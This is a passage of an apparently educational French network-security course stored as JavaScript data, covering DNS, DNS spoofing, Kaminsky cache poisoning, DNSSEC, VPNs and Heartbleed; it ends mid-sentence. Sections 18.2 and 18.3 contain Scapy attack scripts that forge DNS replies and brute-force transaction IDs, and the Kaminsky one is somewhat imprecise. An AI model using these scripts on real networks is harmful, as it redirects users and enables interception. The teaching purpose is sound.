    {id:"s18_fonc",short:"18.1 Comment DNS fonctionne",title:"18.1 Fonctionnement du DNS",content:"\n<div class=\"prose\">\n<p>Le <strong>DNS (Domain Name System)</strong> est l'annuaire d'Internet. Il traduit des noms lisibles par l'humain (ex. <code>www.example.com</code>) en adresses IP numériques (ex. <code>93.184.216.34</code>) utilisables par les machines.</p>\n<p>La traduction peut aller dans les deux sens : <strong>résolution directe</strong> (nom → IP) et <strong>résolution inverse</strong> (IP → nom). Le DNS est distribué et hiérarchique — aucun serveur seul ne connaît tous les noms.</p>\n</div>\n<div class=\"diagram\">\n<div class=\"diagram-title\">Hiérarchie DNS — 4 niveaux</div>\n<div class=\"mem-diagram\">\n                    [.] Domaine Racine (Root)\n                   / | \\\n                 /   |   \\\n               /     |     \\\n           [.com]  [.fr]  [.org]  ← Domaines de 1er niveau (TLD)\n           /   \\                     Top-Level Domains, gérés par ICANN\n         /       \\\n   [google.com] [example.com]      ← Domaines de 2e niveau\n                     |               Enregistrés chez un registrar\n                [www.example.com]   ← Sous-domaines (3e niveau)</div></div>\n\n<div class=\"prose\">\n<h3 class=\"sub\">Types d'enregistrements DNS</h3>\n</div>\n<table class=\"dt\">\n<tr><th>Type</th><th>Description</th><th>Exemple</th></tr>\n<tr><td><strong>A</strong></td><td>Nom → Adresse IPv4</td><td>example.com → 93.184.216.34</td></tr>\n<tr><td><strong>AAAA</strong></td><td>Nom → Adresse IPv6</td><td>example.com → 2606:2800:220:1:248:1893:25c8:1946</td></tr>\n<tr><td><strong>MX</strong></td><td>Serveur de messagerie</td><td>example.com → mail.example.com (prio 10)</td></tr>\n<tr><td><strong>NS</strong></td><td>Serveur de noms d'une zone</td><td>example.com → ns1.example.com</td></tr>\n<tr><td><strong>CNAME</strong></td><td>Alias (redirection)</td><td>www.example.com → example.com</td></tr>\n<tr><td><strong>PTR</strong></td><td>IP → Nom (résolution inverse)</td><td>34.216.184.93.in-addr.arpa → example.com</td></tr>\n<tr><td><strong>SOA</strong></td><td>Début d'autorité (zone)</td><td>Paramètres de la zone (TTL, serial...)</td></tr>\n</table>\n\n<h3 class=\"sub\">18.1.3 Processus de résolution — Comment ça marche</h3>\n<div class=\"diagram\">\n<div class=\"diagram-title\">Résolution itérative de www.example.com</div>\n<div class=\"diag-seq\">\n  <div class=\"step-left\">Client (10.0.2.68)</div>\n  <div></div>\n  <div class=\"step-right\">Résolveur local (FAI)</div>\n  <div class=\"step-left\">Qui est www.example.com ?</div>\n  <div class=\"step-arrow-r\">──────→</div>\n  <div class=\"step-right\" style=\"opacity:.4\">...</div>\n  <div class=\"step-desc\">1. Client interroge son résolveur local (configuré via DHCP ou /etc/resolv.conf)</div>\n\n  <div class=\"step-left\" style=\"opacity:.4\">...</div>\n  <div class=\"step-arrow-r\">──→ [Root] Qui est .com ?</div>\n  <div class=\"step-right\" style=\"opacity:.4\">...</div>\n  <div class=\"step-desc\">2. Résolveur interroge un serveur racine → reçoit l'adresse des serveurs .com</div>\n\n  <div class=\"step-left\" style=\"opacity:.4\">...</div>\n  <div class=\"step-arrow-r\">──→ [.com TLD] Qui est example.com ?</div>\n  <div class=\"step-right\" style=\"opacity:.4\">...</div>\n  <div class=\"step-desc\">3. Résolveur interroge serveur TLD .com → reçoit ns1.example.com</div>\n\n  <div class=\"step-left\" style=\"opacity:.4\">...</div>\n  <div class=\"step-arrow-r\">──→ [ns1.example.com] www ?</div>\n  <div class=\"step-right\" style=\"opacity:.4\">...</div>\n  <div class=\"step-desc\">4. Résolveur interroge le serveur autoritaire → reçoit 93.184.216.34</div>\n\n  <div class=\"step-left\">93.184.216.34 (TTL=86400)</div>\n  <div class=\"step-arrow-l\">←──────</div>\n  <div class=\"step-right\">Cache: www.example.com = 93.184.216.34</div>\n  <div class=\"step-desc\">5. Résolveur renvoie l'IP au client ET la met en cache (durée = TTL)</div>\n</div></div>\n<div class=\"code-block\"><div class=\"code-label\">Interroger le DNS manuellement</div>\n<pre># Résolution simple :\nnslookup www.example.com\ndig www.example.com\n\n# Interroger un serveur DNS spécifique :\ndig @8.8.8.8 www.example.com\n\n# Résolution inverse (IP → nom) :\ndig -x 93.184.216.34\n\n# Voir le TTL et la section autorité :\ndig +authority www.example.com\n\n# Tracer la résolution complète (résolution itérative) :\ndig +trace www.example.com</pre></div>\n"},
    {id:"s18_local",short:"18.2 Attaque locale",title:"18.2 Usurpation DNS sur le LAN",content:"\n<div class=\"prose\">\n<p>Si l'attaquant est sur le même LAN que la victime, il peut écouter les requêtes DNS émises par la victime et envoyer une fausse réponse avant que le vrai serveur DNS ait le temps de répondre.</p>\n<p>Ce type d'attaque fonctionne car UDP est utilisé pour la plupart des requêtes DNS (le port 53 UDP est standard). Il n'y a <strong>pas d'authentification</strong> : la victime acceptera la première réponse qui arrive avec le bon <strong>Transaction ID</strong> (16 bits).</p>\n</div>\n<div class=\"info-box warn\"><div class=\"ib-title\">Champ Transaction ID — La seule protection</div>\n<p>Chaque requête DNS inclut un identifiant de transaction sur 16 bits (0–65535). Une réponse n'est acceptée que si elle contient le <em>même</em> ID que la requête. Problème : 16 bits = seulement 65536 valeurs possibles → facilement bruteforce-able !</p></div>\n<div class=\"code-block\"><div class=\"code-label\">Attaque DNS locale avec Scapy (dns_spoof.py)</div>\n<pre\">from scapy.all import *\nimport re\n\ndef spoof_dns(pkt):\n    # Vérifier que c'est une requête DNS (qr=0) vers une zone cible\n    if DNS in pkt and pkt[DNS].qr == 0:\n        qname = pkt[DNS].qd.qname.decode()\n        \n        if re.match(r'.*example\\.com', qname):\n            # Forger la réponse DNS\n            spoofed = (\n                IP(dst=pkt[IP].src, src=pkt[IP].dst) /\n                UDP(dport=pkt[UDP].sport, sport=53) /\n                DNS(\n                    id  = pkt[DNS].id,    # MEME ID que la requête !\n                    qr  = 1,              # C'est une réponse\n                    aa  = 1,              # Autoritaire (mentir !)\n                    rd  = pkt[DNS].rd,    # Recursion souhaitée\n                    qd  = pkt[DNS].qd,    # Même question\n                    an  = DNSRR(\n                        rrname = qname,\n                        ttl    = 10,\n                        rdata  = '1.2.3.4'  # Fausse IP (attaquant)\n                    )\n                )\n            )\n            send(spoofed, verbose=0)\n            print(f\"DNS spoofé : {qname} → 1.2.3.4\")\n\nprint(\"Sniffing reqêtes DNS...\")\nsniff(iface=\"enp0s3\", filter=\"udp port 53\", prn=spoof_dns)\n# Résultat : la victime qui visite example.com est redirigée vers l'attaquant !</pre></div>\n"},
    {id:"s18_cache",short:"18.3 Cache Poisoning / Kaminsky",title:"18.3 Empoisonnement de Cache et Attaque Kaminsky",content:"\n<div class=\"prose\">\n<p>L'attaque par empoisonnement du cache DNS cible le <strong>résolveur récursif</strong> (du FAI ou d'une organisation). Si on réussit à corrompre le cache du résolveur, <strong>tous les milliers d'utilisateurs</strong> qui dépendent de ce résolveur sont affectés — pas seulement un.</p>\n</div>\n<div class=\"diagram\">\n<div class=\"diagram-title\">Empoisonnement du cache — Impact massif</div>\n<div style=\"display:grid;grid-template-columns:1fr auto 1fr;gap:10px;align-items:center\">\n  <div style=\"text-align:center\">\n    <div class=\"diag-node attacker\">Attaquant<br><small>envoie fausses réponses</small></div>\n  </div>\n  <div style=\"text-align:center;color:var(--red);font-size:.9rem\">→ Cache<br>corrompu<br>↓</div>\n  <div style=\"text-align:center\">\n    <div class=\"diag-node\" style=\"background:rgba(251,191,36,.12);border-color:var(--yellow)\">Résolveur FAI<br><small>cache empoisonné</small></div>\n  </div>\n</div>\n<div style=\"text-align:center;margin:8px 0;color:var(--muted);font-size:.75rem\">↙ ↓ ↘</div>\n<div style=\"display:flex;gap:8px;justify-content:center\">\n  <div class=\"diag-node\">Client A</div>\n  <div class=\"diag-node\">Client B</div>\n  <div class=\"diag-node\">Client C</div>\n  <div style=\"color:var(--muted);font-size:.75rem;display:flex;align-items:center\">... millers de clients</div>\n</div>\n<div style=\"text-align:center;margin:8px 0;color:var(--red);font-size:.8rem\">Tous les clients voient la fausse IP de l'attaquant !</div>\n</div>\n\n<h3 class=\"sub\">L'Attaque de Kaminsky (2008)</h3>\n<div class=\"prose\">\n<p>Découverte par Dan Kaminsky en 2008, cette attaque permit d'empoisonner les caches DNS beaucoup plus efficacement que les méthodes précédentes. Elle exploite le fait que le résolveur fait des requêtes pour des sous-domaines aléatoires.</p>\n</div>\n<div class=\"info-box danger\"><div class=\"ib-title\">Étapes de l'attaque de Kaminsky</div>\n<ol>\n<li>L'attaquant force le résolveur à interroger le serveur autoritaire pour <code>random1234.example.com</code> (sous-domaine inexistant, le résolveur n'a pas ce résultat en cache)</li>\n<li>Pendant que le résolveur attend la réponse légitime, l'attaquant envoie des milliers de fausses réponses avec des Transaction IDs variés (0 à 65535)</li>\n<li>La fausse réponse n'inclut pas seulement l'enregistrement pour <code>random1234.example.com</code> mais aussi une <strong>section autorité falsifiée</strong> qui redirige TOUT le domaine <code>example.com</code> vers un faux serveur autoritaire</li>\n<li>Si la Requête a un Transaction ID = ID deviné → <strong>cache corrompu pour tout example.com</strong></li>\n<li>Répéter avec de nouveaux sous-domaines aléatoires jusqu'à succès (en moyenne 32768 tentatives)</li>\n</ol></div>\n<div class=\"code-block\"><div class=\"code-label\">Simulation simplifiée de l'attaque Kaminsky</div>\n<pre\">from scapy.all import *\nimport random\n\nNS_NAME   = \"ns.attacker.com\"\nNS_IP     = \"1.2.3.4\"          # Faux serveur autoritaire\nTARGET    = \"example.com\"\nRESOLVER  = \"10.0.2.53\"        # Résolveur cible\n\ndef attack():\n    # Générer un sous-domaine aléatoire pour forcer une nouvelle requête\n    subdomain = f\"www{random.randint(1,999999)}.{TARGET}\"\n    \n    # Étape 1 : Forcer le résolveur à faire une requête\n    query = (IP(dst=RESOLVER)/UDP(dport=53)/\n             DNS(rd=1, qd=DNSRR(qname=subdomain, qtype=\"A\")))\n    send(query, verbose=0)\n    \n    # Étape 2 : Bruteforcer le Transaction ID avec de fausses réponses\n    for txid in range(0, 65536):\n        reply = (\n            IP(dst=RESOLVER, src=\"8.8.8.8\")/  # Se faire passer pour le vrai DNS\n            UDP(sport=53, dport=53)/\n            DNS(\n                id = txid,           # Essayer tous les IDs\n                qr = 1, aa = 1,\n                qd = DNSRR(qname=subdomain),\n                an = DNSRR(rrname=subdomain, rdata=\"1.2.3.4\"),\n                # SECTION NS : Corrompre TOUT le domaine example.com\n                ns = DNSRR(rrname=TARGET, qtype=\"NS\", rdata=NS_NAME),\n                ar = DNSRR(rrname=NS_NAME, rdata=NS_IP, ttl=600)\n            )\n        )\n        send(reply, verbose=0)\n        \nfor _ in range(100):  # Recommencer avec de nouveaux sous-domaines\n    attack()\nprint(\"Attaque terminée, vérifier le cache !\")\n# dig @RESOLVER example.com  ← Devrait maintenant retourner NS_IP</pre></div>\n\n<div class=\"info-box note\"><div class=\"ib-title\">Contre-mesures (post-Kaminsky)</div>\n<ul>\n<li><strong>Randomisation du port source (Port Randomization)</strong> : BIND 9.5+, Unbound. Au lieu de toujours utiliser le port 53 comme port source, le résolveur utilise un port aléatoire. Augmente l'entropie de 16 bits (TxID) à 32 bits (TxID + port) → 2 milliards de combinaisons</li>\n<li><strong>DNSSEC</strong> : signe cryptographiquement les enregistrements. La seule vraie solution</li>\n<li><strong>0x20 encoding</strong> : mélange aléatoire de majuscules/minuscules dans el nom de domaine de la requête pour augmenter l'entropie</li>\n</ul></div>\n"},
    {id:"s18_dnssec",short:"18.4-6 DNSSEC et DNS Rebinding",title:"18.4-6 DNSSEC et DNS Rebinding",content:"\n<div class=\"prose\">\n<p><strong>DNSSEC</strong> (DNS Security Extensions) est un ensemble d'extensions de sécurité qui ajoutent une <strong>authentification cryptographique</strong> aux réponses DNS. Il garantit l'intégrité et l'authenticité des données DNS via des signatures numériques.</p>\n<p>DNSSEC repose sur une <strong>chaîne de confiance</strong> : la racine (Root) est signée → les TLD sont signés → les zones de second niveau sont signées → chaque enregistrement est signé.</p>\n</div>\n<table class=\"dt\">\n<tr><th>Enregistrement</th><th>Contenu</th><th>Rôle</th></tr>\n<tr><td><strong>DNSKEY</strong></td><td>Clé publique RSA/ECDSA</td><td>Clé utilisée pour vérifier les signatures de la zone</td></tr>\n<tr><td><strong>RRSIG</strong></td><td>Signature d'un Resource Record Set</td><td>Preuve que les enregistrements d'un type sont authentiques</td></tr>\n<tr><td><strong>DS</strong></td><td>Hash de la DNSKEY enfant</td><td>Délégation de confiance de la zone parente vers la zone enfant</td></tr>\n<tr><td><strong>NSEC/NSEC3</strong></td><td>Pointeur vers l'enregistrement suivant</td><td>Preuve d'inexistence (un nom n'existe pas dans la zone)</td></tr>\n</table>\n<div class=\"code-block\"><div class=\"code-label\">Vérifier DNSSEC avec dig</div>\n<pre># Vérifier si une zone est signée DNSSEC :\ndig dnssec.works A +dnssec\n\n# Résultat attendu si DNSSEC activé :\n# ;; flags: qr rd ra ad; ← Le bit \"ad\" (Authenticated Data) est mis !\n# ;; ANSWER SECTION:\n# dnssec.works.  300 IN A    173.230.150.182\n# dnssec.works.  300 IN RRSIG A 13 2 300 ... (signature)\n\n# Voir la chaîne de confiance complète :\ndig +sigchase +trusted-key=/etc/trusted-key.key example.com\n\n# Vérifier les enregistrements DNSKEY d'une zone :\ndig DNSKEY example.com +short\n\n# Vérifier les DS dans la zone parente :\ndig DS example.com @a.gtld-servers.net</pre></div>\n<div class=\"info-box note\"><div class=\"ib-title\">DNSSEC protège l'intégrité, pas la confidentialité</div>\n<p>DNSSEC ne chiffre PAS les réponses DNS. Un attaquant peut toujours écouter vos requêtes et voir quels sites vous visitez. Pour la confidentialité, utilisez :</p>\n<ul>\n<li><strong>DoH (DNS over HTTPS)</strong> : requêtes DNS chiffrées dans HTTPS (port 443)</li>\n<li><strong>DoT (DNS over TLS)</strong> : requêtes DNS chiffrées dans TLS (port 853)</li>\n</ul></div>\n"}
]};
const ch19={id:"ch19",num:19,icon:"\ud83d\udd12",title:"Réseau Privé Virtuel (VPN)",desc:"Tunnels VPN via TUN/TAP Linux, TLS 1.3, OpenVPN (configuration complète), IPsec (AH/ESP, mode tunnel/transport).",sections:[
    {id:"s19_intro",short:"19.1 Introduction VPN",title:"19.1 Introduction aux VPN",content:"\n<div class=\"prose\">\n<p>Un <strong>VPN (Virtual Private Network)</strong> crée un tunnel sécurisé sur un réseau non fiable (comme Internet). Il fournit trois garanties de sécurité fondamentales pour les communications :</p>\n</div>\n<table class=\"dt\">\n<tr><th>Propriété</th><th>Description</th><th>Mécanisme</th></tr>\n<tr><td><strong>Confidentialité</strong></td><td>Personne ne peut lire les données en transit</td><td>Chiffrement AES-256, ChaCha20</td></tr>\n<tr><td><strong>Intégrité</strong></td><td>Les données ne peuvent pas être modifiées</td><td>HMAC-SHA256, GCM</td></tr>\n<tr><td><strong>Authentification</strong></td><td>On sait qui est l'autre bout du tunnel</td><td>Certificats X.509, clés pre-shared</td></tr>\n</table>\n<div class=\"diagram\">\n<div class=\"diagram-title\">Les 3 cas d'utilisation des VPN</div>\n<div style=\"display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;font-size:.8rem\">\n  <div class=\"info-box note\" style=\"margin:0\">\n    <div class=\"ib-title\">Accès distant</div>\n    <div class=\"diag-flow\" style=\"flex-direction:column;gap:4px\">\n      <div class=\"diag-node\">Télétravailleur</div>\n      <div style=\"color:var(--muted);text-align:center;font-size:.7rem\">↓ Internet chiffré ↓</div>\n      <div class=\"diag-node server\">Réseau entreprise</div>\n    </div>\n    <p style=\"font-size:.75rem;margin-top:6px\">L'employé accède au réseau interne depuis chez lui</p>\n  </div>\n  <div class=\"info-box ok\" style=\"margin:0\">\n    <div class=\"ib-title\">Site-à-site</div>\n    <div class=\"diag-flow\" style=\"flex-direction:column;gap:4px\">\n      <div class=\"diag-node\">Siège Paris</div>\n      <div style=\"color:var(--muted);text-align:center;font-size:.7rem\">↓ Tunnel permanent ↓</div>\n      <div class=\"diag-node server\">Filiale Lyon</div>\n    </div>\n    <p style=\"font-size:.75rem;margin-top:6px\">Relier deux réseaux distants en permanence</p>\n  </div>\n  <div class=\"info-box tip\" style=\"margin:0\">\n    <div class=\"ib-title\">Personnel (privé)</div>\n    <div class=\"diag-flow\" style=\"flex-direction:column;gap:4px\">\n      <div class=\"diag-node\">Utilisateur</div>\n      <div style=\"color:var(--muted);text-align:center;font-size:.7rem\">↓ Tout chiffré ↓</div>\n      <div class=\"diag-node server\">Serveur VPN public</div>\n    </div>\n    <p style=\"font-size:.75rem;margin-top:6px\">Anonymat, contourner censure, WiFi public sécurisé</p>\n  </div>\n</div>\n</div>\n"},
    {id:"s19_tun",short:"19.2 Tunnel TUN/TAP",title:"19.2 Interface TUN/TAP et Tunnélisation",content:"\n<div class=\"prose\">\n<p>Linux fournit deux types d'interfaces réseau virtuelles :</p>\n<ul>\n<li><strong>TUN</strong> : interface virtuelle de couche 3 (IP). Travaille avec des paquets IP. Chaque paquet lu porte un en-tête IP complet.</li>\n<li><strong>TAP</strong> : interface virtuelle de couche 2 (Ethernet). Travaille avec des trames Ethernet. Permet de créer des VPN au niveau Ethernet (ex. connecter des VM comme si sur le même switch).</li>\n</ul>\n</div>\n<div class=\"diagram\">\n<div class=\"diagram-title\">Comment fonctionne le tunnel VPN avec TUN</div>\n<div class=\"mem-diagram\">\n<span class=\"mem-ok\">1. Application génère un paquet IP vers 192.168.1.1</span>\n<span class=\"mem-neutral\">   ↓ routage noyau → interface tun0</span>\n<span class=\"mem-ok\">2. Programme VPN lit le paquet IP depuis /dev/net/tun</span>\n<span class=\"mem-neutral\">   ↓ le paquet est maintenant dans l'espace utilisateur</span>\n<span class=\"mem-leak\">3. Programme VPN CHIFFRE le paquet (AES-256)</span>\n<span class=\"mem-neutral\">   ↓ encapsule dans UDP ou TCP</span>\n<span class=\"mem-ok\">4. Paquet chiffré envoyé via socket UDP sur Internet (eth0)</span>\n<span class=\"mem-neutral\">   ↓ transit sur Internet (personne ne peut lire)</span>\n<span class=\"mem-ok\">5. Serveur VPN reçoit, DÉCHIFFRE, réinjecte dans son tun0</span>\n<span class=\"mem-neutral\">   ↓ routage vers la destination finale</span>\n<span class=\"mem-ok\">6. La réponse revient dans l'autre sens</span></div></div>\n<div class=\"code-block\"><div class=\"code-label\">Création et configuration d'une interface TUN</div>\n<pre>#include &lt;linux/if_tun.h&gt;\n#include &lt;sys/ioctl.h&gt;\n#include &lt;fcntl.h&gt;\n\nint tun_alloc(char *dev) {\n    struct ifreq ifr;\n    \n    // Ouvrir le périphérique virtuel\n    int fd = open(\"/dev/net/tun\", O_RDWR);\n    if(fd < 0) { perror(\"open /dev/net/tun\"); return -1; }\n    \n    memset(&ifr, 0, sizeof(ifr));\n    // IFF_TUN = interface TUN (couche IP)\n    // IFF_TAP = interface TAP (couche Ethernet)\n    // IFF_NO_PI = pas de packet info (juste les données IP brutes)\n    ifr.ifr_flags = IFF_TUN | IFF_NO_PI;\n    strncpy(ifr.ifr_name, dev, IFNAMSIZ); // Nom : \"tun0\"\n    \n    // Créer l'interface virtuelle\n    if(ioctl(fd, TUNSETIFF, &ifr) < 0) {\n        perror(\"ioctl TUNSETIFF\"); close(fd); return -1;\n    }\n    \n    return fd; // fd est maintenant lié à l'interface TUN\n}\n\n// Utilisation :\nint main() {\n    char tun_name[] = \"tun0\";\n    int  tun_fd     = tun_alloc(tun_name);\n    \n    // Configurer l'interface (équivalent ip command) :\n    system(\"ip addr add 10.9.0.1/24 dev tun0\");\n    system(\"ip link set tun0 up\");\n    system(\"ip route add 192.168.1.0/24 dev tun0\"); // Tunnéliser ce sous-réseau\n    \n    // Lire les paquets IP que le noyau route vers tun0 :\n    char buffer[2000];\n    while(1) {\n        int n = read(tun_fd, buffer, sizeof(buffer));\n        // buffer contient maintenant un paquet IP complet !\n        // Étape suivante : chiffrer et envoyer via UDP vers le serveur VPN\n        process_packet(buffer, n);\n    }\n    return 0;\n}</pre></div>\n"},
    {id:"s19_tls",short:"19.3 TLS + OpenVPN",title:"19.3 TLS/SSL et OpenVPN",content:"\n<div class=\"prose\">\n<p><strong>TLS (Transport Layer Security)</strong> — anciennement SSL — est le protocole qui sécurise HTTPS, et est aussi au cœur d'OpenVPN. Il fournit le chiffrement et l'authentification sur un canal de transport (TCP ou UDP).</p>\n</div>\n<div class=\"diagram\">\n<div class=\"diagram-title\">Handshake TLS 1.3 simplifié</div>\n<div class=\"diag-seq\">\n  <div class=\"step-left\">Client</div>\n  <div></div>\n  <div class=\"step-right\">Serveur</div>\n\n  <div class=\"step-left\">ClientHello (TLS 1.3, suites crypto, clé publique ECDH)</div>\n  <div class=\"step-arrow-r\">──────────────→</div>\n  <div class=\"step-right\" style=\"opacity:.4\">...</div>\n\n  <div class=\"step-left\" style=\"opacity:.4\">...</div>\n  <div class=\"step-arrow-l\">←──────────────</div>\n  <div class=\"step-right\">ServerHello (suite choisie, clé ECDH, certificat X.509, Finished)</div>\n\n  <div class=\"step-left\">[Vérifier cert. via CA] Finished</div>\n  <div class=\"step-arrow-r\">──────────────→</div>\n  <div class=\"step-right\" style=\"opacity:.4\">...</div>\n  <div class=\"step-desc\">Client et serveur dérivent la même clé symétrique via ECDH. Tout le reste est chiffré.</div>\n</div></div>\n<div class=\"code-block\"><div class=\"code-label\">Configuration minimale OpenVPN (server.conf)</div>\n<pre\"># ─── OpenVPN Server Configuration ───\nport     1194\nproto    udp\ndev      tun\n\n# Fichiers PKI (générés avec easy-rsa)\nca      ca.crt          # Certificat de l'Autorité de Certification\ncert    server.crt      # Certificat du serveur\nkey     server.key      # Clé privée du serveur\ndh      dh2048.pem      # Paramètres Diffie-Hellman\n\n# Réseau VPN\nserver 10.8.0.0 255.255.255.0   # IP pool pour clients VPN\nifconfig-pool-persist ipp.txt    # Mémoriser les IPs attribuées\n\n# Faire passer TOUT le trafic Internet via le VPN :\npush \"redirect-gateway def1 bypass-dhcp\"\npush \"dhcp-option DNS 8.8.8.8\"\n\n# Routes supplémentaires poussées aux clients :\npush \"route 192.168.10.0 255.255.255.0\"  # Réseau interne\n\n# Sécurité\ncipher   AES-256-GCM    # Chiffrement symétrique fort\nauth     SHA256          # Authentification des paquets\ntls-auth ta.key 0        # Protection contre les attaques DoS sur le handshake\nkeepalive 10 120         # Ping toutes les 10s, timeout 120s\npersist-key\npersist-tun\nuser  nobody\ngroup nogroup\n</pre></div>\n"},
    {id:"s19_ipsec",short:"19.4 IPsec",title:"19.4 IPsec — Mode Transport et Tunnel",content:"\n<div class=\"prose\">\n<p><strong>IPsec</strong> est une suite de protocoles qui opère à la couche 3 (réseau/IP) contrairement à TLS (couche 4, transport). Il peut sécuriser n'importe quel protocole de la couche supérieure de manière transparente pour les applications.</p>\n</div>\n<table class=\"dt\">\n<tr><th>Protocole</th><th>Confidentialité</th><th>Intégrité</th><th>Authentification</th><th>Usage</th></tr>\n<tr><td><strong>AH</strong> (Authentication Header)</td><td>Non</td><td>Oui</td><td>Oui</td><td>Rarement (pas de chiffrement)</td></tr>\n<tr><td><strong>ESP</strong> (Encapsulating Security Payload)</td><td>Oui</td><td>Oui</td><td>Oui</td><td>Quasi-universel</td></tr>\n</table>\n\n<div class=\"diagram\">\n<div class=\"diagram-title\">Mode Transport vs Mode Tunnel IPsec</div>\n<div class=\"mem-diagram\">\n<span class=\"mem-ok\">MODE TRANSPORT (Hôte-à-hôte) :</span>\n<span class=\"mem-neutral\">Original : [IP hdr | TCP hdr | DATA              ]</span>\n<span class=\"mem-ok\">Avec ESP  : [IP hdr | ESP hdr | TCP hdr | DATA chiffré | ESP trailer | ESP auth ]</span>\n<span class=\"mem-neutral\">           ↑ même IP hdr     ↑ la charge utile est chiffrée mais IP visible</span>\n\n<span class=\"mem-neutral\">                                                               </span>\n<span class=\"mem-leak\">MODE TUNNEL (Site-à-site, VPN) :</span>\n<span class=\"mem-neutral\">Original : [IP hdr | TCP hdr | DATA              ]</span>\n<span class=\"mem-leak\">Avec ESP  : [Nouvel IP hdr | ESP hdr | IP hdr original chiffré | TCP | DATA ]</span>\n<span class=\"mem-neutral\">            ↑ IP des gateways ↑ TOUT le paquet original est encapsulé et chiffré</span></div></div>\n<div class=\"code-block\"><div class=\"code-label\">Configurer un tunnel IPsec avec StrongSwan</div>\n<pre\"># /etc/ipsec.conf (sur le gateway)\nconfig setup\n    charondebug=\"ike 2, knl 2, cfg 2\"\n\nconn site-to-site\n    auto         = start\n    type         = tunnel\n    left         = 10.0.1.1        # IP locale du gateway\n    leftsubnet   = 192.168.1.0/24  # Réseau local (Paris)\n    right        = 10.0.2.1        # IP du gateway distant\n    rightsubnet  = 192.168.2.0/24  # Réseau distant (Lyon)\n    ike          = aes256gcm16-sha256-ecp256!  # Algorithme IKE\n    esp          = aes256gcm16-sha256!          # Algorithme ESP\n    authby       = pubkey           # Authentification via certificats\n    leftcert     = paris.crt\n    rightcert    = lyon.crt\n\n# Commandes de gestion :\nsudo ipsec up site-to-site     # Établir le tunnel\nsudo ipsec status              # Vérifier l'état\nsudo ipsec down site-to-site   # Fermer le tunnel</pre></div>\n"}
]};
const ch20={id:"ch20",num:20,icon:"\ud83d\udc94",title:"Heartbleed — Bug et Attaque",desc:"CVE-2014-0160 : lecture de mémoire RAM du serveur via Heartbeat TLS. Vol de clés privées, mots de passe, cookies.",sections:[
    {id:"s20_ctx",short:"20.1 Contexte + Impact",title:"20.1 Contexte et Impact de Heartbleed",content:"\n<div class=\"prose\">\n<p><strong>Heartbleed</strong> (CVE-2014-0160) est une vulnérabilité critique divulguée en <strong>avril 2014</strong> dans la bibliothèque cryptographique open-source <strong>OpenSSL</strong>. Elle permet à un attaquant distant de lire jusqu'à <strong>64 Ko de la mémoire vive du serveur</strong> par requête, sans aucune authentification et sans laisser aucune trace dans les journaux.</p>\n<p>OpenSSL est la bibliothèque TLS/SSL la plus utilisée au monde — elle sécurise HTTPS sur des centaines de millions de serveurs web, de serveurs mail, de VPN, etc. Au moment de la divulgation, environ <strong>17% de tous les serveurs HTTPS</strong> (500 000 serveurs) étaient vulnérables.</p>\n</div>\n<div class=\"info-box danger\"><div class=\"ib-title\">Pourquoi Heartbleed est une catastrophe absolue</div>\n<ul>\n<li>🔑 <strong>Vol de clé privée TLS</strong> : La clé privée du serveur peut se trouver en mémoire. Si un attaquant la vole, il peut déchiffrer TOUT le trafic passé (capturer avec Wireshark pendant des mois) ET présent, et monter des attaques Man-in-the-Middle.</li>\n<li>🔐 <strong>Vol de mots de passe</strong> : Les formulaires HTTPS contenant des mots de passe sont traités en mémoire → peuvent fuiter.</li>\n<li>🍪 <strong>Vol de cookies de session</strong> : Les cookies de session des serveurs web peuvent fuiter → impersonification des utilisateurs.</li>\n<li>📁 <strong>Fuite de données sensibles</strong> : Numéros de carte bancaire, données personnelles, etc.</li>\n<li>👻 <strong>Aucune trace</strong> : L'attaque n'est pas visible dans les journaux Apache/Nginx standards.</li>\n<li>🌐 <strong>Pas d'authentification requise</strong> : N'importe qui sur Internet peut exploiter la faille.</li>\n</ul></div>\n<table class=\"dt\">\n<tr><th>Aspect</th><th>Détail</th></tr>\n<tr><td>CVE</td><td>CVE-2014-0160</td></tr>\n<tr><td>CVSS Score</td><td>7.5 / 10 (HIGH)</td></tr>\n<tr><td>Versions affectées</td><td>OpenSSL 1.0.1 à 1.0.1f (et 1.0.2-beta)</td></tr>\n<tr><td>Date de découverte</td><td>1er avril 2014 (Google Security Team + Codenomicon)</td></tr>\n<tr><td>Patch</td><td>OpenSSL 1.0.1g (7 avril 2014)</td></tr>\n<tr><td>Type de vulnérabilité</td><td>Buffer Over-read (lecture hors limites)</td></tr>\n<tr><td>Attaquants connus</td><td>NSA (allégations), criminels financiers, hackers</td></tr>\n</table>\n"},
    {id:"s20_hb",short:"20.2 Extension Heartbeat",title:"20.2 L'extension TLS Heartbeat et le Bug",content:"\n<div class=\"prose\">\n<p>L'extension TLS <strong>Heartbeat</strong> (RFC 6520, 2012) est une fonctionnalité conçue pour maintenir les connexions TLS actives. Elle fonctionne comme un \"keep-alive\" TLS :</p>\n<ol>\n<li>Une extrémité envoie un <strong>HeartbeatRequest</strong> : un type (1=request), une longueur déclarée, et un payload (données arbitraires de test)</li>\n<li>L'autre extrémité doit répondre avec exactement le même message (<strong>HeartbeatResponse</strong>)</li>\n</ol>\n<p>L'idée est de vérifier que la connexion est encore alive sans avoir à envoyer de vraies données applicatives.</p>\n</div>\n\n<div class=\"diagram\">\n<div class=\"diagram-title\">Message HeartbeatRequest légitime</div>\n<div class=\"mem-diagram\">\n<span class=\"mem-ok\">Transport TLS : [Record Type=24 (Heartbeat) | Version | Longueur du Record]</span>\n<span class=\"mem-ok\">Heartbeat msg : [Type=1 (Request) | Longueur payload (2 octets) | Payload | Padding]</span>\n\nExemple légitime (payload = 3 octets \"abc\") :\n<span class=\"mem-ok\">  Type        = 0x01 (HeartbeatRequest)</span>\n<span class=\"mem-ok\">  Longueur    = 0x0003 (3 octets)</span>\n<span class=\"mem-ok\">  Payload     = 0x61 0x62 0x63 (\"abc\")</span>\n<span class=\"mem-ok\">  Réponse attendue : les mêmes 3 octets \"abc\"</span></div></div>\n\n<h3 class=\"sub\">Le Bug — Aucune validation de la longueur</h3>\n<div class=\"prose\">\n<p>Le problème fatal est dans le code OpenSSL qui traite le HeartbeatRequest : il fait confiance à la longueur <strong>déclarée par le client</strong> sans vérifier que le payload est effectivement aussi long.</p>\n<p>Si le client dit \"la longueur est 65535\" mais envoie un payload de seulement 1 octet, OpenSSL copie quand même <strong>65535 octets</strong> depuis la mémoire — en lisant les 65534 octets qui suivent le payload en mémoire. Ces octets peuvent contenir n'importe quoi : clés privées, mots de passe, données d'autres connexions.</p>\n</div>\n\n<div class=\"code-block\"><div class=\"code-label\">Code vulnerable OpenSSL (ssl/d1_both.c, 